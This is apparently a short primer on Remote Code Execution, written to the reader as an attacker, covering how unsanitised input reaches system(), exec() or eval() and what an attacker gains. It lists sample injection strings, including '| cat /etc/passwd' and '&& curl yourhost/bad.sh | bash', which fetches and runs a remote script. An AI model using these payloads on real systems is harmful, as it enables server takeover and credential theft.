What is RCE?
Remote Code Execution happens when an app takes your input and runs it as code — shell commands, Python, PHP, etc.

If you can control that input, you can execute commands on the server, not just mess with the app — you own the box.

How Does RCE Happen?
When user input gets passed into system functions like system(), exec(), eval(), etc.

Common in file uploads, form fields, URL parameters, or broken APIs.

Can be blind (no output) or interactive (you see command output).

Real-World Triggers
File upload forms that let you upload .php or .jsp and run it.

Web apps that let you "ping" or "traceroute" a host and directly pass your input to a system command.

APIs that call scripts and pass your data directly into code without sanitizing it.

Example Commands You’d Inject
; whoami

| cat /etc/passwd

&& curl yourhost/bad.sh | bash

You're breaking out of the original command and injecting your own.

Why RCE Is Dangerous
Full server takeover if permissions allow

You can pivot to internal networks

Dump environment variables, DB creds, or deploy malware

Can lead to privilege escalation

You exploit RCE by injecting into vulnerable parameters in URLs, form inputs, 
headers, or file uploads—anywhere user input gets passed to the server’s code or shell commands.
